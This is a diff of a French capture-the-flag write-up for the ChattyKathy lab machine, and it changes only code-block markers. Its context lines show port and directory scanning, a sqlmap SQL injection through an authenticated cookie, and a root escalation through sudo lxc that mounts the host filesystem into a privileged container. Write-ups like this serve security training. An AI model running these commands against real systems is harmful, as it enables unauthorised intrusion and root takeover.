@@ -8,7 +8,7 @@ Last one standing
 
 Je termine cette série de CTF de [iamv1nc3nt](https://iamv1nc3nt.com/) avec ce boot2root baptisé *ChattyKathy*.  
 
-```plain
+```
 $ sudo nmap -sCV -p- -T5 192.168.56.28 
 [sudo] Mot de passe de root :  
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-11 09:39 CET 
@@ -30,7 +30,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 On a droit à la page par défaut d'Ubuntu, fouillons un peu avec *Feroxbuster* :  
 
-```plain
+```
 $ feroxbuster -u http://192.168.56.28/ -w /fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-files.txt
 
  ___  ___  __   __     __      __         __   ___
@@ -103,7 +103,7 @@ Content-Type: text/html; charset=UTF-8
 
 En énumérant les dossiers je trouve quelques pistes :  
 
-```plain
+```
 301        9l       28w      316c http://192.168.56.28/plugins 
 301        9l       28w      317c http://192.168.56.28/database 
 301        9l       28w      316c http://192.168.56.28/uploads 
@@ -132,7 +132,7 @@ J'ajoute une entrée dans mon fichier */etc/hosts* et je parviens à me connecte
 
 L'appli web a des URLs de ce type :  
 
-```plain
+```
 http://chattykathy/admin/?page=responses/manage&id=12
 ```
 
@@ -144,7 +144,7 @@ Maintenant il y a le paramètre *id* et lui semble vulnérable à une faille d'i
 
 *SQLmap* valide cette découverte. Il faut lui donner le cookie pour qu'il passe l'authentification :  
 
-```plain
+```
 $ python sqlmap.py --cookie="PHPSESSID=h46pcdnluucg56usr2jj5fgj4v" \
   -u "http://chattykathy/admin/?page=responses/manage&id=15" -p id --dbms mysql --risk 3 --level 5
 --- snip ---
@@ -169,7 +169,7 @@ Parameter: id (GET)
 
 En jouant avec les différentes options de SQLmap j'ai extrait les infos suivantes :  
 
-```plain
+```
 current user: 'webuser@localhost'
 
 available databases [5]: 
@@ -232,7 +232,7 @@ Mais ceux-ci ne m'apporteront aucun bénéfice car il y a bien un utilisateur *t
 
 Cet utilisateur peut appeler *lxc* avec les privilèges de root :  
 
-```plain
+```
 tommy@chattykathy:/var/www/html$ sudo -l 
 [sudo] password for tommy:  
 Matching Defaults entries for tommy on chattykathy: 
@@ -255,7 +255,7 @@ drwx------ 3 tommy tommy 4096 Jan 25 15:33 snap
 
 Je ne connais pas bien LXC mais c'est comme du Docker mis à part que certains éléments de langage changent :  
 
-```plain
+```
 tommy@chattykathy:~$ sudo /snap/bin/lxc image list 
 +---------+--------------+--------+-------------------------------+--------------+-----------+--------+------------------------------+ 
 |  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |         UPLOAD DATE          | 
@@ -275,7 +275,7 @@ Je suppose que l'exploitation est du même type à savoir monter la racine de l'
 
 Il aura fallut seulement quelques essais pour trouver le bon shell à demander à l'image Alpine :  
 
-```plain
+```
 tommy@chattykathy:~$ sudo /snap/bin/lxc init myimage devloop -c security.privileged=true 
 Creating devloop 
 tommy@chattykathy:~$ sudo /snap/bin/lxc config device add devloop mydevice disk source=/ path=/hostfs recursive=true             
